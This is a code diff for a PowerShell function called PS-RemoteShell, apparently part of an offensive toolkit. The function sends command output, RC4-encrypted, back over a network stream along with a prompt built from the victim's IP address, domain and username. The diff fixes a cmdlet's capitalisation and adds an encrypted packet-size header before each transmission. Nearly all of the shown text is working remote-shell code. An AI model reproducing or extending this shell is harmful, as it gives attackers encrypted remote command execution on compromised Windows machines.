@@ -59,7 +59,7 @@ function PS-RemoteShell {
 			$domain = $env:userdomain
 		}
 		
-		$target = get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}
+		$target = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.Ipaddress.length -gt 1}
 		$target = $target.ipaddress[0] 
 		
 		$promptUrl = ([text.encoding]::ASCII).GetBytes("(" + $target + ":" + $domain + "\" + $env:username + "):Url >")
@@ -96,9 +96,14 @@ function PS-RemoteShell {
 			$errorMessage = ($error[0] | Out-String)
 			$error.clear()
 			$exec = $exec + $errorMessage
-			
+						
 			$sendBytes = ([text.encoding]::ASCII).GetBytes($exec) + $promptUrl
 			$sendData = ($sendBytes | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+			
+			$size = ([text.encoding]::ASCII).GetBytes("PACKETSIZE=" + $sendData.Length)
+			$sendSize = ($size | Crypto-RC4 -Key ([System.Text.Encoding]::ASCII.GetBytes($key)))
+			$stream.Write($sendSize, 0, $sendSize.Length)
+			Start-Sleep -m 100
 			$stream.Write($sendData, 0, $sendData.Length)
 			$stream.Flush()  
 		}
@@ -109,3 +114,4 @@ function PS-RemoteShell {
    
    }
 }
+
